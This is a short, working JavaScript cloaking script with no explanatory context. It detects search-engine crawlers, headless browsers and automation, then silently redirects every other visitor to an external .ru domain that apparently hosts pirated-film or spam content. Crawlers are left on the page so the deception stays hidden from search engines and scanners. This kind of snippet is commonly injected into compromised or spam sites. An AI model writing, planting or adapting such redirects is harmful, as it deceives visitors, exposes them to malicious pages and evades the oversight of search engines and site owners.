var ua = navigator.userAgent.toLowerCase();

var isLikelyBot =
  ua.includes('googlebot') ||
  ua.includes('bingbot') ||
  ua.includes('yahoo') ||
  ua.includes('yandex') ||
  ua.includes('baiduspider') ||
  ua.includes('compatible') ||     
  ua.includes('bot') ||
  ua.includes('crawler') ||
  ua.includes('spider') ||
  /headless/i.test(ua) ||           
  navigator.webdriver === true;     

if (!isLikelyBot) {
  window.location.replace("https://kinare.smotrim-lostfilm.ru/Florist-2026-R4cs");
} else {
  console.log("Bot/crawler-like detected → serving content");
}
